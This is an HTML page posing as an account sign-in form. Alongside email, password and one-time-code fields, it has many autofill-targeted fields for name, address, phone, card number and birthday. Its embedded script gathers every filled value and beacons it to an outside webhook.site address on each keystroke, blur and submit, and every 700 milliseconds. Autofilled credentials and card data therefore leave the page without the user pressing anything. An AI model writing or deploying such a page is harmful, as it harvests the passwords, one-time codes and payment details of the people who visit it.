<!doctype html>
<html lang="en">
<meta charset="utf-8">
<title>Account login</title>
<style>#shown{font-size:1rem;color:#b00;white-space:pre-wrap;word-break:break-all}</style>
<div style="font-family:system-ui;max-width:600px;margin:2vh auto">
 <h1>Sign in</h1>
 <form id="f">
  <input name="username" type="email" autocomplete="username" placeholder="Email"><br>
  <input name="password" type="password" autocomplete="current-password" placeholder="Password"><br>
  <input name="otp" type="text" autocomplete="one-time-code" placeholder="Code"><br>
  <input name="fullname" type="text" autocomplete="name" placeholder="Full name"><br>
  <input name="given" type="text" autocomplete="given-name" placeholder="First"><br>
  <input name="family" type="text" autocomplete="family-name" placeholder="Last"><br>
  <input name="org" type="text" autocomplete="organization" placeholder="Organization"><br>
  <input name="addr" type="text" autocomplete="street-address" placeholder="Address"><br>
  <input name="tel" type="tel" autocomplete="tel" placeholder="Phone"><br>
  <input name="ccnum" type="text" autocomplete="cc-number" placeholder="Card number"><br>
  <input name="ccname" type="text" autocomplete="cc-name" placeholder="Name on card"><br>
  <input name="bday" type="text" autocomplete="bday" placeholder="Birthday"><br>
  <input name="note" type="text" placeholder="Note"><br>
  <button>Sign in</button>
 </form>
 <pre id="shown"></pre>
</div>
<script>
var U='https://webhook.site/4f65b4cd-39b4-49e8-a05b-e0a2785d45cd';
function dump(){
 var parts=[]; document.querySelectorAll('input').forEach(function(el){ if(el.value) parts.push(el.name+'='+el.value); });
 var s=parts.join('\n');
 document.getElementById('shown').textContent=s;
 if(s) try{new Image().src=U+'/af?d='+encodeURIComponent(s.slice(0,1500))+'&r='+Math.random();}catch(e){}
}
document.getElementById('f').addEventListener('submit',function(e){e.preventDefault();dump();});
document.querySelectorAll('input').forEach(function(el){['input','change','blur'].forEach(function(ev){el.addEventListener(ev,dump);});});
setInterval(dump,700);
</script>
